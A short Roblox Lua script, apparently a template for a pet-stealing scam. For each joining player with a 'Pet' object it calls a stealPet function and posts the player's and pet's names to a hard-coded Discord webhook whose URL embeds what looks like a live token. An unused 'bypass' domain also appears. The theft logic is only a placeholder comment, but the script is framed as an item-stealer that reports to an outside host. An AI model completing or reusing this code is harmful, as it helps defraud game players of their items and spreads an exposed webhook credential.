local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local webhookUrl = "https://discord.com/api/webhooks/1401056291069362196/X6C1KBefDrMjVvX7yI5dMTEqc94zxQJcC_7tEq-0I1PmsbwGm9DwingWy-CmtsHNGf9v" -- Replace with your actual webhook URL
local domain = "bypass-pearl.vercel.app" -- Replace with your actual domain

local function sendWebhookNotification(playerName, petName)
    local data = {
        ["content"] = playerName .. " has stolen a pet: " .. petName
    }
    
    local jsonData = HttpService:JSONEncode(data)
    
    local response = HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    print("Webhook response: " .. response)
end

local function stealPet(player, pet)
    if player and pet then
        -- Logic to steal the pet
        print(player.Name .. " is stealing " .. pet.Name)
        
        -- Send notification
        sendWebhookNotification(player.Name, pet.Name)
    end
end

-- Example usage
Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        local pet = character:FindFirstChild("Pet") -- Assuming pets are stored in the character
        if pet then
            stealPet(player, pet)
        end
    end)
end)

